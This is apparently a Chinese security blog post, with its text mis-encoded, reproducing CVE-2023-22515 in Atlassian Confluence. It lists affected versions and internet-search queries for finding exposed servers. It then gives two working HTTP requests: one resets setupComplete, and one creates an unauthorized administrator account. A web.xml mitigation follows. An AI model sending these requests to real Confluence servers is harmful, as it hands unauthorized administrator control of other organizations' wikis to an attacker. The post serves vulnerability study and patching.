#  CVE-2023-22515ï¼šConfluenceæƒé™æå‡æ¼æ´

åŸåˆ› Locks_  [ Timeline Sec ](javascript:void\(0\);)

**Timeline Sec** ![]()

å¾®ä¿¡å· TimelineSec

åŠŸèƒ½ä»‹ç» å­¦ç½‘ç»œå®‰å…¨å¿…å¤‡ï¼Œä¸“æ³¨äºæœ€æ–°æ¼æ´åˆ†æä¸å¤ç°ï¼ŒåŒæ—¶åˆ†äº«æœ€æ–°å®‰å…¨èµ„è®¯ã€‚ï¼ˆTimeline Secç½‘ç»œå®‰å…¨å›¢é˜Ÿå®˜æ–¹å…¬ä¼—å·ï¼‰

____

___å‘è¡¨äº_

æ”¶å½•äºåˆé›† #æ¼æ´å¤ç°æ–‡ç« åˆé›† 140ä¸ª

> å…³æ³¨æˆ‘ä»¬â¤ï¸ï¼Œæ·»åŠ æ˜Ÿæ ‡ğŸŒŸï¼Œä¸€èµ·å­¦å®‰å…¨ï¼  
> ä½œè€…ï¼šLocks_@Timeline Sec  
> æœ¬æ–‡å­—æ•°ï¼š926  
> é˜…è¯»æ—¶é•¿ï¼š2ï½3min  
> å£°æ˜ï¼šä»…ä¾›å­¦ä¹ å‚è€ƒä½¿ç”¨ï¼Œè¯·å‹¿ç”¨ä½œè¿æ³•ç”¨é€”ï¼Œå¦åˆ™åæœè‡ªè´Ÿ  
>

## 0x01 ç®€ä»‹  

Confluenceæ˜¯ä¸€ä¸ªä¸“ä¸šçš„ä¼ä¸šçŸ¥è¯†ç®¡ç†ä¸ååŒè½¯ä»¶ï¼Œä¹Ÿå¯ä»¥ç”¨äºæ„å»ºä¼ä¸šwikiã€‚ä½¿ç”¨ç®€å•ï¼Œå®ƒå¼ºå¤§çš„ç¼–è¾‘å’Œç«™ç‚¹ç®¡ç†ç‰¹å¾èƒ½å¤Ÿå¸®åŠ©å›¢é˜Ÿæˆå‘˜ä¹‹é—´å…±äº«ä¿¡æ¯ã€æ–‡æ¡£åä½œã€é›†ä½“è®¨è®ºï¼Œä¿¡æ¯æ¨é€ã€‚

## 0x02 æ¼æ´æ¦‚è¿°  

 **æ¼æ´ç¼–å·ï¼šCVE-2023-22515**

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æœ‰è®¿é—®æƒé™çš„Confluence Data Center and
Serverå®ä¾‹æ¼æ´åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹åˆ›å»ºConfluenceç®¡ç†å‘˜ç”¨æˆ·å¹¶ä»¥ç®¡ç†å‘˜æƒé™è¿›å…¥Confluenceåå°ã€‚

## 0x03 å½±å“ç‰ˆæœ¬  

8.0.0 <= Confluence Data Center and Confluence Server <= 8.0.4

8.1.0 <= Confluence Data Center and Confluence Server <= 8.1.4

8.2.0 <= Confluence Data Center and Confluence Server <= 8.2.3

8.3.0 <= Confluence Data Center and Confluence Server <= 8.3.2

8.4.0 <= Confluence Data Center and Confluence Server <= 8.4.2

8.5.0 <= Confluence Data Center and Confluence Server <= 8.5.1

## 0x04 ç¯å¢ƒæ­å»º  

fofaï¼š`app="Atlassian-Confluence"`

hunterï¼š`app.name="Confluence"`

## 0x05 æ¼æ´å¤ç°  

æ¼æ´URL:

    
    
    http://localhost/login.action?logout=true  
    

ç¬¬ä¸€æ¬¡å‘åŒ…ï¼šå‘é€é¦–æ¬¡è¯·æ±‚åŒ…ä¸ºï¼š

    
    
    GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1  
    

![]()

ç¬¬äºŒæ¬¡å‘åŒ…ï¼šæ·»åŠ ç®¡ç†å‘˜è´¦å·

    
    
    POST /setup/setupadministrator.action HTTP/1.1  
    Host: localhost  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0  
    Accept-Encoding: gzip, deflate  
    Accept: */*  
    Connection: close  
    X-Atlassian-Token: no-check  
    Content-Length: 122  
    Content-Type: application/x-www-form-urlencoded  
      
    username=newadmin1&fullName=newadmin1&email=1234567123@qq.com&password=newPassword1&confirm=newPassword1&setup-next-button=Next  
    

![]()  
  
![]()

å‡­å€Ÿæ–°æ·»åŠ çš„è´¦å·è¿›è¡Œç™»å½•

![]()

åˆ©ç”¨æ€è·¯ï¼š

1ã€åˆ©ç”¨ ParametersInterceptor çš„å±æ€§è¦†ç›–ç»•è¿‡  **/setup/** * è·¯ç”±çš„é™åˆ¶ï¼Œè®¿é—®
`/setup/setupadministrator.action`  æ·»åŠ ç®¡ç†å‘˜

2ã€æ‰¾åˆ°èƒ½è§¦å‘ ParametersInterceptor çš„ actionï¼Œç„¶åè¦†ç›– setupComplete ç»•è¿‡
SetupCheckInterceptor å¯¹  **/setup/** * è·¯ç”±çš„é™åˆ¶ï¼Œç„¶åè®¿é—®
`/setup/setupadministrator.action`  æ·»åŠ ç®¡ç†å‘˜ã€‚

## 0x06 ä¿®å¤æ–¹å¼  

 **å®˜æ–¹ä¿®å¤æ–¹æ¡ˆï¼š**

å»ºè®®æ‚¨æ›´æ–°å½“å‰ç³»ç»Ÿæˆ–è½¯ä»¶è‡³æœ€æ–°ç‰ˆï¼Œå®Œæˆæ¼æ´çš„ä¿®å¤ã€‚

 **ä¸´æ—¶ç¼“è§£æ–¹æ¡ˆ:**

1ã€ä¿®æ”¹ //confluence/WEB-INF/web.xml æ–‡ä»¶ï¼Œå¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼ˆå°±åœ¨æ–‡ä»¶æœ«å°¾çš„  æ ‡ç­¾ä¹‹å‰ï¼‰ï¼š

    
    
    <security-constraint>  
          <web-resource-collection>  
            <url-pattern>/setup/*</url-pattern>  
          <http-method-omission>*</http-method-omission>  
        </web-resource-collection>  
          <auth-constraint />  
      </security-constraint>  
    

2ã€é‡æ–°å¯åŠ¨ Confluence

## å‚è€ƒé“¾æ¥  

https://mp.weixin.qq.com/s/99quAfbrwkXS40MqMUBY2w

 **æ¨èæœåŠ¡**

![]()

 **å†å²æ¼æ´**

[
CVE-2019-3394](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483714&idx=1&sn=4a67ecbce88d9cc135ede2de6e0bc240&chksm=903927b2a74eaea4a67627c698bd67ce51984e58e8eacdf1d538b6ed2e69c34560167338fa69&scene=21#wechat_redirect)  
CVE-2019-3396  
CVE-2019-3398  
CVE-2021-26084  
CVE-2022-26134  
[CVE-2022-26138](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247490609&idx=1&sn=eb47834f70a7608f59739d1331c89598&chksm=90393ac1a74eb3d764e9378b2cead991968dc10f4c7accd38d022eb78f30e5977f20d3abd03e&scene=21#wechat_redirect)  

  

 **åå°åŠŸèƒ½**  

å›å¤ã€1ã€‘é¢†å–æ–°äººå­¦ä¹ èµ„æ–™  
å›å¤ã€2ã€‘è¿›å…¥æ¼æ´æŸ¥è¯¢åŠŸèƒ½  
å›å¤ã€3ã€‘è·å–åŠ ç¾¤æ–¹å¼  
å›å¤ã€4ã€‘é¢†å–å®‰å…¨ç”µå­ä¹¦ç±  

å›å¤ã€5ã€‘è¿›å…¥SRC-QQäº¤æµç¾¤

  

 **å•†åŠ¡åˆä½œ  
**

[ Timeline
Secå›¢é˜Ÿå¯åˆä½œé¡¹ç›®æ¸…å•](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247491949&idx=1&sn=5fd239d21a4a07859707b810c2a431ab&chksm=903ac79da74d4e8bf12c52fa3f3a0b14a9fbca35472362d4c40a4d9a6968a16e8d449896889c&scene=21#wechat_redirect)  

é¢„è§ˆæ—¶æ ‡ç­¾ä¸å¯ç‚¹

å¾®ä¿¡æ‰«ä¸€æ‰«  
å…³æ³¨è¯¥å…¬ä¼—å·

[çŸ¥é“äº†](javascript:;)

å¾®ä¿¡æ‰«ä¸€æ‰«  
ä½¿ç”¨å°ç¨‹åº

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

ï¼š ï¼Œ ã€‚   è§†é¢‘ å°ç¨‹åº èµ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆèµ åœ¨çœ‹ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆåœ¨çœ‹

